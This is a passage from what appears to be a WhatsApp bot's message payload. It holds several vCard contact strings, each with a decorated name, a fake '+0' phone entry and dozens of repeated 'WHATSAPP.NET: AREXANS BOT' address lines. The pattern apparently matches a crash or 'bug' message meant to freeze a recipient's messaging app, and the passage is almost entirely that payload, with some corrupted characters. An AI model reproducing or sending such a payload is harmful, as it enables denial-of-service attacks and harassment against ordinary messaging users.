𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕?? 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
							},
							{
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>;;;\nFN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>\nitem1.TEL;waid=0:+0\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈??𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕?? 咽翁 𝔹𝕆??️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️️️\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
							},
							{
							    "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>;;;\nFN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>\nitem1.TEL;waid=0:+0\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 ??𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹??𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈??𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 